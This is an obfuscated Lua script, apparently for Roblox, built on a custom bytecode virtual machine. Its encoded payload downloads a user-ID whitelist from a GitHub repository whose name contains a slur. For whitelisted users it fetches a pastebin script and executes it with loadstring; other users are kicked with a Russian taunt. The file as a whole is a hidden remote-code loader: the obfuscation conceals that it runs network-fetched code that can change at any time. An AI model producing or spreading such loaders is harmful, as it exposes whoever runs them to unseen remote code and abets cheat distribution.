local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;
local function VMCall(ByteString, vmenv, ...)
	local DIP = 1;
	local repeatNext;
	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
		if (Byte(byte, 2) == 79) then
			repeatNext = StrToNumber(Sub(byte, 1, 1));
			return "";
		else
			local FlatIdent_207CC = 0;
			local a;
			while true do
				if (FlatIdent_207CC == 0) then
					a = Char(StrToNumber(byte, 16));
					if repeatNext then
						local FlatIdent_95CAC = 0;
						local b;
						while true do
							if (FlatIdent_95CAC == 1) then
								return b;
							end
							if (FlatIdent_95CAC == 0) then
								b = Rep(a, repeatNext);
								repeatNext = nil;
								FlatIdent_95CAC = 1;
							end
						end
					else
						return a;
					end
					break;
				end
			end
		end
	end);
	local function gBit(Bit, Start, End)
		if End then
			local FlatIdent_8D327 = 0;
			local Res;
			while true do
				if (FlatIdent_8D327 == 0) then
					Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
					return Res - (Res % 1);
				end
			end
		else
			local Plc = 2 ^ (Start - 1);
			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
		end
	end
	local function gBits8()
		local a = Byte(ByteString, DIP, DIP);
		DIP = DIP + 1;
		return a;
	end
	local function gBits16()
		local FlatIdent_24A02 = 0;
		local a;
		local b;
		while true do
			if (FlatIdent_24A02 == 1) then
				return (b * 256) + a;
			end
			if (FlatIdent_24A02 == 0) then
				a, b = Byte(ByteString, DIP, DIP + 2);
				DIP = DIP + 2;
				FlatIdent_24A02 = 1;
			end
		end
	end
	local function gBits32()
		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
		DIP = DIP + 4;
		return (d * 16777216) + (c * 65536) + (b * 256) + a;
	end
	local function gFloat()
		local FlatIdent_89ECE = 0;
		local Left;
		local Right;
		local IsNormal;
		local Mantissa;
		local Exponent;
		local Sign;
		while true do
			if (FlatIdent_89ECE == 3) then
				if (Exponent == 0) then
					if (Mantissa == 0) then
						return Sign * 0;
					else
						local FlatIdent_6DC53 = 0;
						while true do
							if (0 == FlatIdent_6DC53) then
								Exponent = 1;
								IsNormal = 0;
								break;
							end
						end
					end
				elseif (Exponent == 2047) then
					return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
				end
				return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
			end
			if (FlatIdent_89ECE == 2) then
				Exponent = gBit(Right, 21, 31);
				Sign = ((gBit(Right, 32) == 1) and -1) or 1;
				FlatIdent_89ECE = 3;
			end
			if (FlatIdent_89ECE == 1) then
				IsNormal = 1;
				Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
				FlatIdent_89ECE = 2;
			end
			if (FlatIdent_89ECE == 0) then
				Left = gBits32();
				Right = gBits32();
				FlatIdent_89ECE = 1;
			end
		end
	end
	local function gString(Len)
		local Str;
		if not Len then
			local FlatIdent_61EE = 0;
			while true do
				if (0 == FlatIdent_61EE) then
					Len = gBits32();
					if (Len == 0) then
						return "";
					end
					break;
				end
			end
		end
		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
		DIP = DIP + Len;
		local FStr = {};
		for Idx = 1, #Str do
			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
		end
		return Concat(FStr);
	end
	local gInt = gBits32;
	local function _R(...)
		return {...}, Select("#", ...);
	end
	local function Deserialize()
		local FlatIdent_89237 = 0;
		local Instrs;
		local Functions;
		local Lines;
		local Chunk;
		local ConstCount;
		local Consts;
		while true do
			if (FlatIdent_89237 == 0) then
				Instrs = {};
				Functions = {};
				Lines = {};
				Chunk = {Instrs,Functions,nil,Lines};
				FlatIdent_89237 = 1;
			end
			if (1 == FlatIdent_89237) then
				ConstCount = gBits32();
				Consts = {};
				for Idx = 1, ConstCount do
					local FlatIdent_2E9CB = 0;
					local Type;
					local Cons;
					while true do
						if (FlatIdent_2E9CB == 1) then
							if (Type == 1) then
								Cons = gBits8() ~= 0;
							elseif (Type == 2) then
								Cons = gFloat();
							elseif (Type == 3) then
								Cons = gString();
							end
							Consts[Idx] = Cons;
							break;
						end
						if (FlatIdent_2E9CB == 0) then
							Type = gBits8();
							Cons = nil;
							FlatIdent_2E9CB = 1;
						end
					end
				end
				Chunk[3] = gBits8();
				FlatIdent_89237 = 2;
			end
			if (FlatIdent_89237 == 2) then
				for Idx = 1, gBits32() do
					local FlatIdent_8199B = 0;
					local Descriptor;
					while true do
						if (FlatIdent_8199B == 0) then
							Descriptor = gBits8();
							if (gBit(Descriptor, 1, 1) == 0) then
								local Type = gBit(Descriptor, 2, 3);
								local Mask = gBit(Descriptor, 4, 6);
								local Inst = {gBits16(),gBits16(),nil,nil};
								if (Type == 0) then
									Inst[3] = gBits16();
									Inst[4] = gBits16();
								elseif (Type == 1) then
									Inst[3] = gBits32();
								elseif (Type == 2) then
									Inst[3] = gBits32() - (2 ^ 16);
								elseif (Type == 3) then
									local FlatIdent_8BC55 = 0;
									while true do
										if (FlatIdent_8BC55 == 0) then
											Inst[3] = gBits32() - (2 ^ 16);
											Inst[4] = gBits16();
											break;
										end
									end
								end
								if (gBit(Mask, 1, 1) == 1) then
									Inst[2] = Consts[Inst[2]];
								end
								if (gBit(Mask, 2, 2) == 1) then
									Inst[3] = Consts[Inst[3]];
								end
								if (gBit(Mask, 3, 3) == 1) then
									Inst[4] = Consts[Inst[4]];
								end
								Instrs[Idx] = Inst;
							end
							break;
						end
					end
				end
				for Idx = 1, gBits32() do
					Functions[Idx - 1] = Deserialize();
				end
				return Chunk;
			end
		end
	end
	local function Wrap(Chunk, Upvalues, Env)
		local Instr = Chunk[1];
		local Proto = Chunk[2];
		local Params = Chunk[3];
		return function(...)
			local Instr = Instr;
			local Proto = Proto;
			local Params = Params;
			local _R = _R;
			local VIP = 1;
			local Top = -1;
			local Vararg = {};
			local Args = {...};
			local PCount = Select("#", ...) - 1;
			local Lupvals = {};
			local Stk = {};
			for Idx = 0, PCount do
				if (Idx >= Params) then
					Vararg[Idx - Params] = Args[Idx + 1];
				else
					Stk[Idx] = Args[Idx + 1];
				end
			end
			local Varargsz = (PCount - Params) + 1;
			local Inst;
			local Enum;
			while true do
				local FlatIdent_75224 = 0;
				while true do
					if (FlatIdent_75224 == 0) then
						Inst = Instr[VIP];
						Enum = Inst[1];
						FlatIdent_75224 = 1;
					end
					if (FlatIdent_75224 == 1) then
						if (Enum <= 10) then
							if (Enum <= 4) then
								if (Enum <= 1) then
									if (Enum == 0) then
										local FlatIdent_1076E = 0;
										local Edx;
										local Results;
										local Limit;
										local B;
										local A;
										while true do
											if (1 == FlatIdent_1076E) then
												Inst = Instr[VIP];
												A = Inst[2];
												B = Stk[Inst[3]];
												Stk[A + 1] = B;
												Stk[A] = B[Inst[4]];
												VIP = VIP + 1;
												FlatIdent_1076E = 2;
											end
											if (2 == FlatIdent_1076E) then
												Inst = Instr[VIP];
												Stk[Inst[2]] = Inst[3];
												VIP = VIP + 1;
												Inst = Instr[VIP];
												Stk[Inst[2]] = Inst[3] ~= 0;
												VIP = VIP + 1;
												FlatIdent_1076E = 3;
											end
											if (FlatIdent_1076E == 3) then
												Inst = Instr[VIP];
												A = Inst[2];
												Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
												Top = (Limit + A) - 1;
												Edx = 0;
												for Idx = A, Top do
													Edx = Edx + 1;
													Stk[Idx] = Results[Edx];
												end
												FlatIdent_1076E = 4;
											end
											if (FlatIdent_1076E == 5) then
												Stk[Inst[2]]();
												VIP = VIP + 1;
												Inst = Instr[VIP];
												VIP = Inst[3];
												break;
											end
											if (FlatIdent_1076E == 0) then
												Edx = nil;
												Results, Limit = nil;
												B = nil;
												A = nil;
												Stk[Inst[2]] = Env[Inst[3]];
												VIP = VIP + 1;
												FlatIdent_1076E = 1;
											end
											if (FlatIdent_1076E == 4) then
												VIP = VIP + 1;
												Inst = Instr[VIP];
												A = Inst[2];
												Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
												VIP = VIP + 1;
												Inst = Instr[VIP];
												FlatIdent_1076E = 5;
											end
										end
									else
										local A = Inst[2];
										Stk[A](Unpack(Stk, A + 1, Inst[3]));
									end
								elseif (Enum <= 2) then
									Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
								elseif (Enum > 3) then
									Stk[Inst[2]] = Env[Inst[3]];
								else
									Stk[Inst[2]] = Stk[Inst[3]];
								end
							elseif (Enum <= 7) then
								if (Enum <= 5) then
									local FlatIdent_6053C = 0;
									local Edx;
									local Results;
									local Limit;
									local B;
									local A;
									while true do
										if (FlatIdent_6053C == 2) then
											Inst = Instr[VIP];
											Stk[Inst[2]] = Inst[3];
											VIP = VIP + 1;
											Inst = Instr[VIP];
											Stk[Inst[2]] = Inst[3] ~= 0;
											VIP = VIP + 1;
											FlatIdent_6053C = 3;
										end
										if (FlatIdent_6053C == 4) then
											VIP = VIP + 1;
											Inst = Instr[VIP];
											A = Inst[2];
											Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
											VIP = VIP + 1;
											Inst = Instr[VIP];
											FlatIdent_6053C = 5;
										end
										if (FlatIdent_6053C == 3) then
											Inst = Instr[VIP];
											A = Inst[2];
											Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
											Top = (Limit + A) - 1;
											Edx = 0;
											for Idx = A, Top do
												Edx = Edx + 1;
												Stk[Idx] = Results[Edx];
											end
											FlatIdent_6053C = 4;
										end
										if (FlatIdent_6053C == 6) then
											Inst = Instr[VIP];
											Stk[Inst[2]] = Env[Inst[3]];
											VIP = VIP + 1;
											Inst = Instr[VIP];
											A = Inst[2];
											B = Stk[Inst[3]];
											FlatIdent_6053C = 7;
										end
										if (FlatIdent_6053C == 5) then
											A = Inst[2];
											Stk[A] = Stk[A]();
											VIP = VIP + 1;
											Inst = Instr[VIP];
											Stk[Inst[2]] = Stk[Inst[3]];
											VIP = VIP + 1;
											FlatIdent_6053C = 6;
										end
										if (FlatIdent_6053C == 0) then
											Edx = nil;
											Results, Limit = nil;
											B = nil;
											A = nil;
											Stk[Inst[2]] = Env[Inst[3]];
											VIP = VIP + 1;
											FlatIdent_6053C = 1;
										end
										if (FlatIdent_6053C == 7) then
											Stk[A + 1] = B;
											Stk[A] = B[Inst[4]];
											break;
										end
										if (FlatIdent_6053C == 1) then
											Inst = Instr[VIP];
											A = Inst[2];
											B = Stk[Inst[3]];
											Stk[A + 1] = B;
											Stk[A] = B[Inst[4]];
											VIP = VIP + 1;
											FlatIdent_6053C = 2;
										end
									end
								elseif (Enum == 6) then
									local A;
									A = Inst[2];
									Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									if Stk[Inst[2]] then
										VIP = VIP + 1;
									else
										VIP = Inst[3];
									end
								else
									do
										return;
									end
								end
							elseif (Enum <= 8) then
								if Stk[Inst[2]] then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							elseif (Enum == 9) then
								local FlatIdent_66799 = 0;
								local A;
								while true do
									if (FlatIdent_66799 == 0) then
										A = Inst[2];
										Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
										break;
									end
								end
							else
								local B;
								local A;
								A = Inst[2];
								B = Stk[Inst[3]];
								Stk[A + 1] = B;
								Stk[A] = B[Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Inst[3];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								B = Stk[Inst[3]];
								Stk[A + 1] = B;
								Stk[A] = B[Inst[4]];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								Stk[Inst[2]] = Inst[3];
								VIP = VIP + 1;
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A](Unpack(Stk, A + 1, Inst[3]));
								VIP = VIP + 1;
								Inst = Instr[VIP];
								VIP = Inst[3];
							end
						elseif (Enum <= 15) then
							if (Enum <= 12) then
								if (Enum > 11) then
									Stk[Inst[2]] = Inst[3];
								else
									for Idx = Inst[2], Inst[3] do
										Stk[Idx] = nil;
									end
								end
							elseif (Enum <= 13) then
								Stk[Inst[2]]();
							elseif (Enum > 14) then
								if (Stk[Inst[2]] == Inst[4]) then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							else
								local FlatIdent_581C8 = 0;
								local A;
								local B;
								while true do
									if (FlatIdent_581C8 == 1) then
										Stk[A + 1] = B;
										Stk[A] = B[Inst[4]];
										break;
									end
									if (FlatIdent_581C8 == 0) then
										A = Inst[2];
										B = Stk[Inst[3]];
										FlatIdent_581C8 = 1;
									end
								end
							end
						elseif (Enum <= 18) then
							if (Enum <= 16) then
								Stk[Inst[2]] = Inst[3] ~= 0;
							elseif (Enum == 17) then
								local FlatIdent_295EB = 0;
								local A;
								while true do
									if (FlatIdent_295EB == 0) then
										A = Inst[2];
										Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
										break;
									end
								end
							else
								local FlatIdent_1FC27 = 0;
								local A;
								local Results;
								local Limit;
								local Edx;
								while true do
									if (FlatIdent_1FC27 == 1) then
										Top = (Limit + A) - 1;
										Edx = 0;
										FlatIdent_1FC27 = 2;
									end
									if (FlatIdent_1FC27 == 2) then
										for Idx = A, Top do
											local FlatIdent_981A3 = 0;
											while true do
												if (FlatIdent_981A3 == 0) then
													Edx = Edx + 1;
													Stk[Idx] = Results[Edx];
													break;
												end
											end
										end
										break;
									end
									if (FlatIdent_1FC27 == 0) then
										A = Inst[2];
										Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
										FlatIdent_1FC27 = 1;
									end
								end
							end
						elseif (Enum <= 19) then
							local A = Inst[2];
							Stk[A] = Stk[A]();
						elseif (Enum == 20) then
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
						else
							VIP = Inst[3];
						end
						VIP = VIP + 1;
						break;
					end
				end
			end
		end;
	end
	return Wrap(Deserialize(), {}, vmenv)(...);
end
return VMCall("LOL!0C3O00028O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403433O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F5072656D69756D652O7A2F4E6567722E66756E2F6D61696E2F687769642E6C756103073O007365727669636503073O00506C6179657273030B3O004C6F63616C506C6179657203063O0055736572496403213O00682O7470733A2O2F706173746562696E2E636F6D2F7261772F626837546253727603043O004B69636B03093O00D090D18F20D18FD0B9002A3O00120C3O00014O000B000100013O00260F3O0002000100010004153O00020001001204000200023O001205000300033O00202O00030003000400122O000500056O000600016O000300066O00023O00024O0002000100024O000100023O00122O000200033O00202O00020002000600120C000400074O000600020004000200202O00020002000800202O0002000200094O00020001000200062O0002001F00013O0004153O001F0001001204000200023O00122O000300033O00202O00030003000400122O0005000A6O000600016O000300066O00023O00024O00020001000100044O00290001001204000200033O00200A00020002000600122O000400076O00020004000200202O00020002000800202O00020002000B00122O0004000C6O00020004000100044O002900010004153O000200012O00073O00017O00", GetFEnv(), ...);
